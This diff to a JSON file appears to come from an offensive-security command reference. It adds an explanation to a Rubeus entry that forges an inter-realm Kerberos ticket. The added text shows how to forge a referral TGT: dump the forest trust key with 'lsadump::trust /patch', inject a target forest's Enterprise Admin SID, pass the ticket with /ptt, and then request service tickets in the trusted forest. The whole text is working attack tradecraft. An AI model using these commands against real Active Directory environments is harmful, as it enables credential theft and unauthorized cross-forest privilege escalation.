@@ -116,5 +116,6 @@
       "label": "evasive-silver inter-realm TGT (Rubeus)",
       "command": "Rubeus.exe silver /service:krbtgt/<target_forest> /rc4:<trust_key> /sids:<target_EA_sid> /user:Administrator /domain:<domain> /ptt"
     }
-  ]
+  ],
+  "explain": "Forges an inter-realm referral TGT using the shared forest trust key to reach a trusted external forest:\n  golden /rc4:<nt_hash>     here <nt_hash> is the trust key from lsadump::trust /patch\n  /domain:<domain> /sid:<domain_sid>   your (source) domain and SID\n  /sids:<target_enterprise_admin_sid>  target forest privileged SID\n  /service:krbtgt /target:<target_domain>   forge a referral ticket toward the target realm\n  /ptt                      inject it\nThen Rubeus asktgs for a service (e.g. cifs/<dc>) in the target forest. Note: SID filtering across a forest trust usually blocks EA SIDs, so this typically yields only trust-permitted access."
 }
